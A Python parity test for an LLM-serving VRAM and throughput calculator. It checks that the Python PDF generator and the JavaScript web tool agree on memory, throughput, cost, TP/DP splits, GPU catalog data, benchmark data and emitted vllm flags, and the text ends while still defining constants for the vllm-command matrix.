#!/usr/bin/env python3
"""Verify the PDF generator and the web tool compute the same numbers.

index.html and generate_report.py implement the same model twice, in two
languages. That duplication is deliberate (the web tool has no backend, the
report generator has no browser) but it silently drifted once already: the
throughput and dtype bugs lived in both copies, and fixing one would have left
the PDF — which the README calls procurement-ready — quietly wrong.

Extracts compute() from generate_report.py without importing reportlab, runs
computeInference() from index.html under node, and compares field by field.
Also extracts build_vllm_cmd()/buildVllmCommand() — the emitted vllm command
is a second code path in both engines, not covered by the compute() diff
above, and it drifted the same way: above 8 GPUs, index.html split into
TP/DP while generate_report.py kept emitting `--tensor-parallel-size` sized
to the full GPU count with no DP flag at all.

Run:  python3 tests/parity.test.py
"""
import ast
import json
import os
import re
import subprocess
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# ---- load the Python model without pulling in reportlab -------------------
src = open(os.path.join(ROOT, "generate_report.py")).read()
tree = ast.parse(src)
# Every module-level name compute() closes over must be listed here, and must be
# a plain assignment — an annotated one (PERF: dict = {...}) parses as AnnAssign,
# gets skipped, and surfaces as a bare NameError from inside compute() much later.
wanted = {"GIB", "GPUS", "PERF"}
# build_vllm_cmd/split_parallelism/device_count_for don't close over any of the
# above (they take cfg/comp as plain dicts and gpu_count as a plain int), so
# wanted stays as-is — they just need to ride along in the same exec(), because
# compute() now calls split_parallelism(device_count_for(cfg)) for the TP/DP
# split it returns, plus shlex in ns below since build_vllm_cmd shells out to it.
wanted_fns = {"compute", "build_vllm_cmd", "split_parallelism", "supports_nvlink",
              "device_count_for"}
nodes = [
    n for n in tree.body
    if (isinstance(n, ast.FunctionDef) and n.name in wanted_fns)
    or (isinstance(n, ast.Assign)
        and any(getattr(t, "id", None) in wanted for t in n.targets))
]
for name in sorted(wanted_fns):
    assert any(isinstance(n, ast.FunctionDef) and n.name == name for n in nodes), f"{name}() not found"
ns = {"math": __import__("math"), "shlex": __import__("shlex")}
exec(compile(ast.Module(body=nodes, type_ignores=[]), "<gr>", "exec"), ns)
for name in sorted(wanted):
    assert name in ns, f"{name} not extracted from generate_report.py — is it still a top-level assignment?"
compute, GPUS, PERF = ns["compute"], ns["GPUS"], ns["PERF"]
supports_nvlink = ns["supports_nvlink"]
build_vllm_cmd = ns["build_vllm_cmd"]
# build_vllm_cmd() reads the split off comp rather than deriving it, so the
# command matrix at the bottom has to derive one to hand it — with this engine's
# own function, so what that section compares is still two derivations.
split_parallelism, device_count_for = ns["split_parallelism"], ns["device_count_for"]

# ---- run the JS model on the same inputs ----------------------------------
CASES = [
    {"name": "8B bf16, 1 user, H100",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 1, "n_gpu": 1, "gpu": "h100-80"},
    {"name": "8B bf16, 64 users, H100",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 64, "n_gpu": 1, "gpu": "h100-80"},
    # Every other case is bandwidth-bound, which leaves the decode MFU unexercised:
    # it only enters the maths through the compute ceiling, and a ceiling that never
    # binds can drift between the two engines unnoticed. This case sits on it.
    {"name": "8B bf16 on A100 80, compute-bound at high batch (pins decode MFU)",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 1024, "conc": 256, "n_gpu": 1, "gpu": "a100-80"},
    {"name": "70B awq, 4x A100 80",
     "params": 70, "active": 100, "bpp": 0.5, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 4, "gpu": "a100-80"},
    {"name": "70B awq, 8x A100 80, PCIe (penalty scales with count)",
     "params": 70, "active": 100, "bpp": 0.5, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 8, "gpu": "a100-80", "nvlink": False},
    # Twelve devices split TP=4 x DP=3 — the regime where the split and the
    # device count are different numbers, which is where the contract literals
    # below have anything to say. The only other case above eight is the
    # DeepSeek one at 16, and that is MLA, MoE and fp8 all at once.
    {"name": "70B bf16, 12x H100 80 (TP=4 x DP=3)",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 12, "gpu": "h100-80"},
    {"name": "26B MoE fp8, B200, fp8 KV",
     "params": 26, "active": 15, "bpp": 1, "layers": 48, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 128, "n_gpu": 1, "gpu": "b200-192", "kv_bpp": 1},
    {"name": "7B bf16, 2x RTX 4090, no NVLink",
     "params": 7, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 4096, "conc": 8, "n_gpu": 2, "gpu": "rtx4090-24", "nvlink": False},
    {"name": "Gemma 4 26B SWA, long context, H100",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 131072, "conc": 4, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25},
    {"name": "Gemma 4 26B SWA, below the window",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 512, "conc": 16, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25},
    {"name": "DeepSeek V3 MLA, fp8, 16x H100",
     "params": 671, "active": 5, "shared_exp": 1, "bpp": 1, "layers": 61,
     "kv_heads": 128, "h_dim": 56, "ctx": 16384, "conc": 8, "n_gpu": 16,
     "gpu": "h100-80", "attn": "mla", "mla_dim": 576},
    {"name": "70B bf16 on H200 141GB (new GPU entry)",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 16, "n_gpu": 2, "gpu": "h200-141"},
    {"name": "8B bf16 on RTX 5090 (new GPU entry)",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 4, "n_gpu": 1, "gpu": "rtx5090-32"},
    {"name": "27B on L4 24GB, does not fit (new GPU entry)",
     "params": 27, "active": 100, "bpp": 0.5, "layers": 48, "kv_heads": 8, "h_dim": 128,
     "ctx": 4096, "conc": 1, "n_gpu": 1, "gpu": "l4-24"},
    {"name": "Agent stack: 8K shared prefix, 64 users, prefix caching on",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 64, "n_gpu": 1, "gpu": "h100-80",
     "shared_prefix": 8192, "prefix_caching": True},
    {"name": "Same agent stack with prefix caching disabled",
     "params": 8, "active": 100, "bpp": 2, "layers": 32, "kv_heads": 8, "h_dim": 128,
     "ctx": 32768, "conc": 64, "n_gpu": 1, "gpu": "h100-80",
     "shared_prefix": 8192, "prefix_caching": False},
    # A board presenting two devices, with the MI250X's real figures: 128 GB and
    # 3276.8 GB/s per module, 383 dense TFLOPS per module. It is not in the
    # catalog yet — the AMD rows come later — but the derivation that splits a board
    # into devices has to be compared across both engines before then, not after
    # a wrong number ships.
    {"name": "Dual-GCD board, 1 module (device split must be identical in both engines)",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 16, "n_gpu": 1, "gpu": "h100-80",
     "card": {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2,
              "tflops": 383, "name": "Dual-GCD 128 GB", "devices": 2}},
    {"name": "Dual-GCD board, 4 modules = 8 devices",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 16384, "conc": 32, "n_gpu": 4, "gpu": "h100-80",
     "card": {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2,
              "tflops": 383, "name": "Dual-GCD 128 GB", "devices": 2}},
    # A multi-device board without NVLink: the PCIe curve is keyed on the count,
    # and every other dual-GCD case here is NVLink — which is the interconnect a
    # real AMD OAM row will not have.
    {"name": "Dual-GCD board, 2 modules, PCIe (penalty curve keyed on devices)",
     "params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8, "h_dim": 128,
     "ctx": 8192, "conc": 16, "n_gpu": 2, "gpu": "h100-80", "nvlink": False,
     "card": {"gb": 128, "bw": 3276.8, "hyper": 6.0, "spec": 2.5, "spot": 1.2,
              "tflops": 383, "name": "Dual-GCD 128 GB", "devices": 2}},
    {"name": "Gemma SWA with shared prefix — only global layers share",
     "params": 26, "active": 15, "bpp": 2, "layers": 30, "kv_heads": 8, "h_dim": 256,
     "ctx": 32768, "conc": 32, "n_gpu": 1, "gpu": "h100-80",
     "attn": "swa", "swa_win": 1024, "swa_local": 25,
     "shared_prefix": 4096, "prefix_caching": True},
]

js_runner = r"""
const fs=require('fs');
const html=fs.readFileSync(process.argv[1],'utf8');
const gib=html.match(/^const GIB = .+;$/m)[0];
const perf=html.match(/^const PERF = \{[\s\S]*?\n\};$/m)[0];
/* computeInference() derives the TP/DP split it returns through
   parallelismFor()/splitParallelism(), so those have to come into scope with
   it — the same way GIB and PERF do, and the same way wanted_fns already pulls
   split_parallelism() in on the Python side above. Without them this is a bare
   ReferenceError from inside the function. The two are adjacent in the source,
   so one slice carries both. */
const spS=html.indexOf('function splitParallelism('), spE=html.indexOf('function renderStrategyBadges');
if(spS===-1||spE===-1) throw new Error('splitParallelism()/parallelismFor() not found in index.html');
const split=html.slice(spS,spE);
const s=html.indexOf('function computeInference(state) {'), e=html.indexOf('\n}\n',s);
const ci=new Function(`${gib}\n${perf}\n${split}\n${html.slice(s,e+2)}; return computeInference;`)();
const gt=html.match(/^const GPU_TABLE = \{[\s\S]*?\n\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const GPU_TABLE=new Function(`${gt[0]}; return GPU_TABLE;`)();
/* Keyed by catalog slug, which is what a case names. Keying by display name
   meant reproducing getGpuSpec()'s " GB" -> "GB" rewrite here, and this copy
   was unanchored where the source anchors on /$/ — the two agree on all twelve
   current names and disagree on the first name with " GB" in the middle of it,
   as a card carrying a parenthesised suffix would have. */
const G={};
for(const [k,g] of Object.entries(GPU_TABLE)){
  G[k]={gb:g.gb,bw:g.bw,h:g.hyper,sp:g.spec,st:g.spot,tf:g.tflops,
        name:g.name.replace(/ GB$/,'GB'),devices:g.devices};
}
const out=JSON.parse(process.argv[2]).map(c=>{
  /* c.card lets a case carry a row the catalog does not have yet — the
     multi-GCD path has to be compared across both engines before the first
     such board ships, not after. */
  const g=c.card ? {gb:c.card.gb,bw:c.card.bw,h:c.card.hyper,sp:c.card.spec,
                    st:c.card.spot,tf:c.card.tflops,name:c.card.name.replace(/ GB$/,'GB'),
                    devices:c.card.devices} : G[c.gpu];
  if(!g) throw new Error('no GPU_TABLE row for slug '+c.gpu);
  return ci({params:c.params,activePercent:c.active,bytesPerParam:c.bpp,layers:c.layers,
    kvHeads:c.kv_heads,headDim:c.h_dim,sharedExperts:c.shared_exp||0,contextLength:c.ctx,
    concurrency:c.conc,gpuCount:c.n_gpu,hasNVLink:c.nvlink!==false,kvBytesPerValue:c.kv_bpp||2,
    gpuGB:g.gb,gpuBandwidth:g.bw,gpuTFLOPS:g.tf,gpuHyperCost:g.h,gpuSpecCost:g.sp,
    gpuSpotCost:g.st,gpuName:g.name,gpuDevices:g.devices||1,
    attnMode:c.attn||'standard',swaWindow:c.swa_win||0,
    swaLocalLayers:c.swa_local||0,mlaLatentDim:c.mla_dim||0,
    modelMaxCtx:c.max_ctx||1048576,
    sharedPrefix:c.shared_prefix||0,prefixCaching:c.prefix_caching!==false});
});
console.log(JSON.stringify(out));
"""

js_in = [dict(c, max_ctx=c.get("max_ctx", 1048576)) for c in CASES]
proc = subprocess.run(
    ["node", "-e", js_runner, os.path.join(ROOT, "index.html"), json.dumps(js_in)],
    capture_output=True, text=True)
if proc.returncode:
    print("node runner failed:\n" + proc.stderr)
    sys.exit(1)
js_results = json.loads(proc.stdout)

# ---- compare --------------------------------------------------------------
FIELDS = [
    ("weights_gb", "weightsGB", 0.01), ("kv_gb", "kvCacheGB", 0.01),
    ("act_gb", "activationsGB", 0.01), ("total_gb", "totalGB", 0.01),
    ("per_total", "perGPU.total", 0.01), ("free_kv", "freeForKVCache", 0.01),
    ("max_ctx_1", "maxContextSingleUser", 1), ("max_conc_8k", "maxConcurrentAt8K", 1),
    ("single_tok", "singleStreamTokS", 1), ("agg_tok", "aggregateTokS", 1),
    ("agg_obs_lo", "aggregateObservedLoTokS", 1), ("agg_obs_hi", "aggregateObservedHiTokS", 1),
    ("per_user_load", "perUserAtLoadTokS", 1), ("eff_batch", "effectiveBatch", 0),
    ("max_batch_kv", "maxBatchByKV", 0), ("ttft_ms", "ttftMs", 1),
    ("sat_batch", "saturatedBatch", 0), ("sat_tok", "saturatedTokS", 1),
    ("ttft_cold_ms", "ttftColdMs", 1), ("ttft_warm_ms", "ttftWarmMs", 1),
    ("kv_saved_by_prefix_gb", "kvSavedByPrefixGB", 0.01),
    # Cost has never been compared across the engines, and it is the one family
    # of numbers that is scoped to *boards* while everything else is scoped to
    # devices — so a dual-GCD board is exactly where the two would diverge, and
    # nothing would have said so.
    ("hourly_hyper", "hourlyHyper", 0.001), ("hourly_spec", "hourlySpec", 0.001),
    ("hourly_spot", "hourlySpot", 0.001),
    # The device view each engine derived. Nothing compared these, so a Python
    # export scoped to boards would corrupt every figure in the PDF while the
    # web tool stayed right — with the suite green.
    ("device_count", "deviceCount", 0), ("device_gb", "deviceGB", 0.001),
    ("device_bw", "deviceBandwidth", 0.001),
    # The split each engine computed against, not merely the totals it reached.
    # Every renderer and both command builders now read tp/dp off this result,
    # so a disagreement here is a disagreement about how the model is sharded —
    # and the compute fields above cannot see it while nothing divides by tp.
    ("tp", "tp", 0), ("dp", "dp", 0),
    # The engines reach this by different routes — device GB x devices here,
    # board GB x boards there — and nothing compared the results.
    ("total_vram", "totalVRAM", 0.001),
    # The constants as executed, not as extracted — this is what stops the two
    # engines quietly disagreeing about a value no case happens to exercise.
    ("perf_mbu", "perfMbu", 0), ("perf_mfu_decode", "perfMfuDecode", 0),
    ("perf_mfu_prefill", "perfMfuPrefill", 0),
    ("perf_obs_lo", "perfObsLo", 0), ("perf_obs_hi", "perfObsHi", 0),
]
def dig(d, path):
    """Walk a dotted path, so a field mapping can name perGPU.weights as easily
    as perGPU.total — the special case this replaces could name exactly one."""
    for part in path.split("."):
        d = d[part]
    return d

# ---- contract literals: both engines against a number, not each other -----
# Everything above compares the two engines to each other. That is blind by
# construction to any change made symmetrically in both — and the change this
# refactor exists to prepare (weights sharded TP ways instead of across every
# device) is exactly that shape: applied to both engines it moves every
# per-device figure in the tool while this file stays green.
#
# So these are absolute. Worked out by hand, not as expressions over the same
# constants the engines use, because an expression follows the divisor wherever
# it goes and reports nothing:
#
#   70B at bf16      = 70e9 * 2       = 1.4e11 bytes of weights
#   in GiB           = 1.4e11 / 2**30 = 130.385160446167
#   12 devices split TP=4 x DP=3, and every device holds 1/12 of the model:
#                      130.385160446167 / 12 = 10.865430037181 GiB
#
# Weights are actually sharded TP ways, so the honest figure is
# 130.385160446167 / 4 = 32.596290111542 GiB, three times this one. The commit
# that corrects it has to rewrite this literal deliberately and say why. Twelve
# devices because at eight or fewer TP equals the device count and the two
# divisors are the same number, so a pin down there proves nothing.
CONTRACTS = {
    "70B bf16, 12x H100 80 (TP=4 x DP=3)": [
        ("weights per device", "per_w", "perGPU.weights", 10.8654, 1e-4),
        ("tensor-parallel size", "tp", "tp", 4, 0),
        ("data-parallel size", "dp", "dp", 3, 0),
        ("devices", "device_count", "deviceCount", 12, 0),
    ],
}
# A renamed case would silently switch the pins off, which is the failure mode
# a whitelist keyed on a string always has.
_unmatched = set(CONTRACTS) - {c["name"] for c in CASES}
assert not _unmatched, f"CONTRACTS names cases that do not exist: {sorted(_unmatched)}"

passed = failed = 0
for case, js in zip(CASES, js_results):
    cfg = {k: v for k, v in case.items() if k not in ("name", "card")}
    cfg["gpu"] = case.get("card") or GPUS[case["gpu"]]
    cfg.setdefault("max_ctx", 1048576)
    py = compute(cfg)
    bad = []
    for pk, jk, tol in FIELDS:
        a, b = py[pk], dig(js, jk)
        if abs(a - b) > max(tol, abs(b) * 0.001):
            bad.append(f"{pk}: py={a:.4g} js={b:.4g}")
    if bad:
        print(f"  FAIL {case['name']}")
        for m in bad:
            print(f"       {m}")
        failed += 1
    else:
        print(f"  ok   {case['name']}")
        passed += 1

# The verdict flags must agree too — that is the tool's headline answer.
for case, js in zip(CASES, js_results):
    cfg = {k: v for k, v in case.items() if k not in ("name", "card")}
    cfg["gpu"] = case.get("card") or GPUS[case["gpu"]]
    cfg.setdefault("max_ctx", 1048576)
    py = compute(cfg)
    if py["fits"] != js["fits"] or py["comfortable"] != js["comfortable"]:
        print(f"  FAIL {case['name']}: verdict differs "
              f"(py fits={py['fits']} js fits={js['fits']})")
        failed += 1
    else:
        passed += 1

for case, js in zip(CASES, js_results):
    if case["name"] not in CONTRACTS:
        continue
    cfg = {k: v for k, v in case.items() if k not in ("name", "card")}
    cfg["gpu"] = case.get("card") or GPUS[case["gpu"]]
    cfg.setdefault("max_ctx", 1048576)
    py = compute(cfg)
    for label, pk, jk, want, tol in CONTRACTS[case["name"]]:
        for engine, got in (("python", py[pk]), ("js", dig(js, jk))):
            if abs(got - want) > tol:
                print(f"  FAIL {label} ({engine}) is {got!r}, the contract says {want!r} "
                      f"— {case['name']}")
                failed += 1
            else:
                print(f"  ok   {label} ({engine}) is {want!r} — {case['name']}")
                passed += 1

# The same invariant the literal above is one instance of, swept across the
# counts where TP and the device count are different numbers. A change that
# divided by tp at every count except the two the literals happen to name would
# satisfy both literals and ship TP-sharding everywhere else — that is a
# demonstrated falsification of the pins, not a hypothetical, so the shape gets
# stated directly rather than sampled:
#
#     per_w * device_count == weights_gb
#
# "every device holds an equal share of one copy of the model", which is what
# the report asserts in prose as well as in arithmetic. Under TP-sharded weights
# the right-hand side is tp, and this has to be rewritten to say so — once, for
# every count, instead of at whichever counts a fixture happened to use.
# index.html's side of the same invariant is in model.test.js.
PROP_CFG = {"params": 70, "active": 100, "bpp": 2, "layers": 80, "kv_heads": 8,
            "h_dim": 128, "ctx": 8192, "conc": 16, "max_ctx": 1048576}
prop_bad, prop_n, prop_dp = [], 0, 0
for _n in (1, 2, 4, 5, 8, 9, 10, 12, 16, 20, 24, 40, 64, 100, 128):
    # devices=2 as well, because the split is sized in devices and a board count
    # that happened to be the divisor would hide the difference.
    for _devices in (1, 2):
        _c = compute(dict(PROP_CFG, n_gpu=_n,
                          gpu=dict(GPUS["h100-80"], devices=_devices)))
        prop_n += 1
        prop_dp += _c["dp"] > 1
        if abs(_c["per_w"] * _c["device_count"] - _c["weights_gb"]) > _c["weights_gb"] * 1e-12:
            prop_bad.append(
                f"{_n} boards x {_devices} devices (TP={_c['tp']} x DP={_c['dp']}): "
                f"{_c['per_w']} x {_c['device_count']} = {_c['per_w'] * _c['device_count']}, "
                f"not the {_c['weights_gb']} GiB the model weighs")
if prop_bad:
    print("  FAIL per-device weights are not one copy of the model split evenly across devices")
    for _b in prop_bad[:6]:
        print(f"       {_b}")
    failed += 1
elif prop_dp < 16:
    print(f"  FAIL only {prop_dp} of {prop_n} swept configs have dp > 1 — the counts where TP "
          "and the device count differ are the only ones this can speak about")
    failed += 1
else:
    print(f"  ok   per-device weights x device count == the whole model across {prop_n} configs "
          f"({prop_dp} of them with dp > 1)")
    passed += 1

# The GPU tables are maintained twice. Drift there is silent and produces
# confidently wrong numbers, so compare them field by field.
js_side = json.loads(subprocess.run(
    ["node", "-e", """
const fs=require('fs');const h=fs.readFileSync(process.argv[1],'utf8');
const gt=h.match(/^const GPU_TABLE = \\{[\\s\\S]*?\\n\\};$/m);
if(!gt) throw new Error('GPU_TABLE not found in index.html');
const T=new Function(`${gt[0]}; return GPU_TABLE;`)();
const fn=h.match(/^function supportsNVLink\\(gpu\\) \\{.*\\}$/m);
if(!fn) throw new Error('supportsNVLink() not found in index.html');
const supportsNVLink=new Function(`${fn[0]}; return supportsNVLink;`)();
const nvlink={};
for(const [k,g] of Object.entries(T)) nvlink[k]=supportsNVLink(g);
const bd=h.match(/^const BENCHMARK_DATA = \\{[\\s\\S]*?\\n\\};$/m);
if(!bd) throw new Error('BENCHMARK_DATA not found in index.html');
const benchmarks=new Function(`${bd[0]}; return BENCHMARK_DATA;`)();
console.log(JSON.stringify({table:T, nvlink, benchmarks}));""",
     os.path.join(ROOT, "index.html")],
    capture_output=True, text=True).stdout)
js_gpus = js_side["table"]

# Both engines now key on the slug, so compare on that and treat `name` as an
# ordinary field. Joining on the display name (as this did while the names were
# hand-authored) made a name drift invisible — it surfaced as a card missing from
# one side rather than as the mismatch it is.
if set(GPUS) != set(js_gpus):
    only_py = sorted(set(GPUS) - set(js_gpus))
    only_js = sorted(set(js_gpus) - set(GPUS))
    print(f"  FAIL GPU tables list different cards: only-python={only_py} only-js={only_js}")
    failed += 1
else:
    drift = []
    for key in sorted(GPUS):
        # Numeric fields compare with a tolerance; everything else — names,
        # vendor, form, the caps object, the optional default flag — is an
        # exact match, and .get() rather than [] so a field present on one
        # side only reads as drift instead of raising.
        for f in ("gb", "bw", "hyper", "spec", "spot", "tflops",
                  "name", "vendor", "devices", "form", "caps", "default"):
            a, b = GPUS[key].get(f), js_gpus[key].get(f)
            numeric = f in ("gb", "bw", "hyper", "spec", "spot", "tflops", "devices")
            if a is None or b is None:
                # A field on one side only. Comparing it numerically would raise
                # a TypeError from inside the loop and lose the drift report
                # this block exists to print.
                differs = a != b
            elif numeric:
                differs = abs(a - b) > 1e-9
            else:
                differs = a != b
            if differs:
                drift.append(f"{key}.{f}: py={a!r} js={b!r}")
    if drift:
        print("  FAIL GPU tables have drifted")
        for d in drift:
            print(f"       {d}")
        failed += 1
    else:
        print(f"  ok   GPU tables identical across both engines ({len(GPUS)} cards)")
        passed += 1

# ---- generated blocks vs the JSON they are generated from ------------------
# data/gpus.json is the contributor-facing source; both engines carry a generated
# inline copy because a browser on file:// cannot fetch a sibling JSON. Nothing
# forces anyone to re-run tools/sync_data.py, so assert it here: a failure means
# either the JSON was edited without re-running the script, or a generated block
# was hand-edited instead of the source.
gpus_json = json.load(open(os.path.join(ROOT, "data", "gpus.json")))["data"]

for label, inline in (("generate_report.py", GPUS), ("index.html", js_gpus)):
    if inline != gpus_json:
        only_src = sorted(set(gpus_json) - set(inline))
        only_gen = sorted(set(inline) - set(gpus_json))
        diffs = [f"{k}.{f}: json={gpus_json[k].get(f)!r} {label}={inline[k].get(f)!r}"
                 for k in sorted(set(gpus_json) & set(inline))
                 for f in sorted(set(gpus_json[k]) | set(inline[k]))
                 if gpus_json[k].get(f) != inline[k].get(f)]
        print(f"  FAIL {label}'s GPU_TABLE block is out of sync with data/gpus.json")
        if only_src:
            print(f"       missing from {label}: {only_src}")
        if only_gen:
            print(f"       not in the JSON: {only_gen}")
        for d in diffs[:10]:
            print(f"       {d}")
        print("       run: python3 tools/sync_data.py")
        failed += 1
    else:
        print(f"  ok   {label}'s GPU_TABLE block matches data/gpus.json")
        passed += 1

# ---- the NVLink gate, card by card ---------------------------------------
# Both engines decide whether a card can have NVLink at all, and both decide it
# from the catalog's `form`. If they ever disagree, the web tool and the PDF
# apply different interconnect scaling to the same hardware — a 0.85 factor on
# one side and a PCIe curve on the other — with nothing else to catch it: the
# compute() diff above is driven by cases that state nvlink explicitly.
nv_drift = [f"{k}: py={supports_nvlink(GPUS[k])} js={js_side['nvlink'].get(k)}"
            for k in sorted(GPUS)
            if supports_nvlink(GPUS[k]) != js_side["nvlink"].get(k)]
if nv_drift:
    print("  FAIL the two engines disagree about which cards have NVLink")
    for d in nv_drift:
        print(f"       {d}")
    failed += 1
else:
    print(f"  ok   both engines gate NVLink on the same cards ({len(GPUS)} cards)")
    passed += 1

# Two-sided on purpose: a gate that answers the same way for every card would
# pass the agreement check above while being useless. The catalog must contain
# both kinds, and every answer must follow `form` rather than the card's name.
with_nv = sorted(k for k in GPUS if supports_nvlink(GPUS[k]))
without_nv = sorted(k for k in GPUS if not supports_nvlink(GPUS[k]))
by_form = sorted(k for k, g in GPUS.items() if g["form"] == "sxm")
if not with_nv or not without_nv:
    print(f"  FAIL the NVLink gate is not discriminating: with={with_nv} without={without_nv}")
    failed += 1
elif with_nv != by_form:
    print(f"  FAIL NVLink support does not track `form`: gate={with_nv} sxm={by_form}")
    failed += 1
else:
    print(f"  ok   NVLink tracks `form`: {len(with_nv)} cards have it, {len(without_nv)} do not")
    passed += 1

# ---- the same guard, for the benchmark table ------------------------------
# BENCHMARK_DATA had this hole from v1.0 until the block became generated:
# tests/model.test.js substituted benchmarks/data.json in place of the inline
# copy when testing findBenchmark(), so the suite validated the JSON while the
# browser ran the inline block and nothing compared them. They had drifted by
# 16 fields across 13 rows — every `mode`, every `estimated`, every date and
# url, plus six softened `src` strings — which is how two entries measured
# single-stream were scored against an aggregate estimate on screen.
bench_json = json.load(open(os.path.join(ROOT, "benchmarks", "data.json")))["data"]
js_bench = js_side["benchmarks"]

if js_bench != bench_json:
    only_src = sorted(set(bench_json) - set(js_bench))
    only_gen = sorted(set(js_bench) - set(bench_json))
    diffs = [f"{k}.{f}: json={bench_json[k].get(f)!r} index.html={js_bench[k].get(f)!r}"
             for k in sorted(set(bench_json) & set(js_bench))
             for f in sorted(set(bench_json[k]) | set(js_bench[k]))
             if bench_json[k].get(f) != js_bench[k].get(f)]
    print("  FAIL index.html's BENCHMARK_DATA block is out of sync with benchmarks/data.json")
    if only_src:
        print(f"       missing from index.html: {only_src}")
    if only_gen:
        print(f"       not in the JSON: {only_gen}")
    for d in diffs[:10]:
        print(f"       {d}")
    if len(diffs) > 10:
        print(f"       ... and {len(diffs) - 10} more")
    print("       run: python3 tools/sync_data.py")
    failed += 1
else:
    print(f"  ok   index.html's BENCHMARK_DATA block matches benchmarks/data.json "
          f"({len(bench_json)} entries)")
    passed += 1

# The fields that decide how an entry is *presented* rather than what it says.
# Their absence is what made the drift invisible: a missing `mode` reads as
# 'batch' at the call site and a missing `estimated` reads as "measured", so
# both failure modes are silent and confident.
presentation = [f"{k}: {f}" for k, e in sorted(bench_json.items())
                for f in ("mode",) if f not in js_bench.get(k, {})]
if presentation:
    print("  FAIL entries in index.html are missing the fields that decide how they render")
    for m in presentation[:10]:
        print(f"       {m}")
    failed += 1
else:
    est_json = {k for k, e in bench_json.items() if e.get("estimated")}
    est_js = {k for k, e in js_bench.items() if e.get("estimated")}
    single_js = {k for k, e in js_bench.items() if e.get("mode") == "single"}
    if est_json != est_js:
        print(f"  FAIL estimated entries differ: json={sorted(est_json)} index.html={sorted(est_js)}")
        failed += 1
    elif not est_js or not single_js:
        print(f"  FAIL the presentation fields are not discriminating: "
              f"estimated={sorted(est_js)} single={sorted(single_js)}")
        failed += 1
    else:
        print(f"  ok   index.html carries mode on every entry, {len(est_js)} estimated "
              f"and {len(single_js)} single-stream, same as the JSON")
        passed += 1


# ---- emitted vllm command, across a widened matrix -------------------------
# Everything above compares compute() output — VRAM, throughput, verdicts —
# but never the *command* either engine prints, which is a second code path
# in both. It silently diverged above 8 GPUs: index.html split into TP/DP,
# generate_report.py emitted `--tensor-parallel-size <n_gpu>` with no DP flag
# at all. Driven straight off the pure builders (buildVllmCommand /
# build_vllm_cmd) rather than through the full VRAM pipeline above — that
# pipeline's agreement is already covered by CASES; this section is only
# about the command string.
#
# gpu_count is crossed with prefix_caching in full (every count gets both).
# That pairing is what caught generate_report.py never reading
# prefix_caching at all — an earlier version of this matrix pinned
# prefix_caching=True, exactly the one value where the two engines happened
# to agree.
#
# A later review found that *rotating* a field is not the same as
# *exercising its effect*, and this comment previously claimed the rotation
# below closed that gap. It didn't, for three fields: fits was pinned True
# (the "does not fit" short-circuit in both engines never ran), kv_bpp was
# absent on the Python side while JS's kvBytesPerValue was hardcoded to 2
# (so --kv-cache-dtype fp8 never appeared in either output — the exact
# shape of the prefix_caching bug: a flag either engine can silently stop
# emitting), and ctx equaled max_ctx_1 (so max-model-len's min() never had
# to pick between two different operands — a min-to-max mutation would have
# survived). is_moe also never paired with n_gpu == 1, so the n_gpu > 1
# guard on --enable-expert-parallel went untested at the one count where
# dropping it would matter. An overclaiming comment is worse than none,
# because it tells the next reader not to look — so: fits, kv_bpp and ctx
# (deliberately != max_ctx_1) are varied below, and EXTRA_CASES adds the
# is_moe/n_gpu=1 pair plus two fits=False cases explicitly, rather than
# crossing fits into the main grid where it would mostly just suppress
# every other axis it landed on.
#
# quant and is_moe are indexed by g = i // 2 (which GPU_COUNTS entry this
# is), not by i itself, so they vary independently of prefix_caching
# (i % 2) instead of moving in lockstep with it — quant used to (i % 4),
# which meant only 4 of the 8 (quant, prefix_caching) pairs ever occurred.
GPU_COUNTS = [1, 2, 3, 6, 8, 12, 16, 17, 64, 100, 128, 256]
PREFIX_CACHING_VALUES = [True, False]
QUANT_VALUES = [None, "awq", "gptq", "gguf"]
IS_MOE_VALUES = [False, True]
KV_BPP_VALUES = [2, 1]  # BF16 vs FP8 KV cache -> --kv-cache-dtype fp8
MAX_CTX_1 = 8192
CTX_VALUES = [4096, 16384]  # one below MAX_CTX_1, one above — never equal to it
# Benign but not a single constant either — rotated below. All shlex-safe
# (word chars plus @%+=:,./-) so none of these brush up against the
# shell-quoting asymmetry, which is handled separately by UNSAFE_HF_MODELS.
HF_MODEL_VALUES = [
    "/opt/models/YourModel",
    "meta-llama/Llama-3.1-8B-Instruct",
    "/mnt/nfs/models/team-a/checkpoint_v2.1",
]
